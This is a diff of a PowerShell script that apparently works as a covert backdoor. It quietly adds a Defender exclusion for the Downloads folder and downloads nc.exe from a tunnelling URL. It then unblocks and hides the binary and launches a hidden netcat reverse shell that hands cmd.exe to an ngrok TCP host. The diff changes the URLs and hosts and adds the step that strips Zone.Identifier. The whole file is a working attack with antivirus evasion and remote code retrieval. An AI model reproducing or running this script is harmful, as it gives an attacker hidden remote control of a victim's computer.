@@ -8,32 +8,31 @@ function Ensure-WindowsPowerShell {
 Ensure-WindowsPowerShell
 
 try {
-    # === 1. Optional: Add Defender Exclusion (fails silently if not admin) ===
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 } catch {}
 
 try {
-    # === 2. Download Netcat (nc.exe) from public HTTPS URL ===
-    $ncUrl = "https://9d869f58c38aeb.lhr.life/nc.exe"  # Replace with your own localhost.run link
+    $ncUrl = "https://5eb002534d05f6.lhr.life/nc.exe"  # Replace this with your own HTTPS URL
     $ncPath = Join-Path -Path ([Environment]::GetFolderPath("Downloads")) -ChildPath "nc.exe"
 
     Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
 
-    # === 3. Hide the downloaded nc.exe binary ===
+    # Unblock the file to remove Zone.Identifier
+    Unblock-File -Path $ncPath
+
+    # Hide the file (optional)
     Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 } catch {
-    Write-Error "Failed to download or hide nc.exe: $_"
+    Write-Error "Failed to download or unblock nc.exe: $_"
     exit
 }
 
 try {
-    # === 4. Launch Netcat reverse shell to ngrok tunnel ===
-    $ngrokHost = "0.tcp.ngrok.io"      # Replace with your ngrok public TCP hostname
-    $ngrokPort = 19234                 # Replace with your ngrok-assigned port
+    $ngrokHost = "6.tcp.ngrok.io"
+    $ngrokPort = 15655
+    $cmd = "`"$ncPath`" $ngrokHost $ngrokPort -e cmd.exe"
 
-    $args = "-d $ngrokHost $ngrokPort -e cmd.exe"
-
-    Start-Process -FilePath $ncPath -ArgumentList $args -WindowStyle Hidden
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmd" -WindowStyle Hidden
 } catch {
     Write-Error "Failed to start reverse shell: $_"
 }
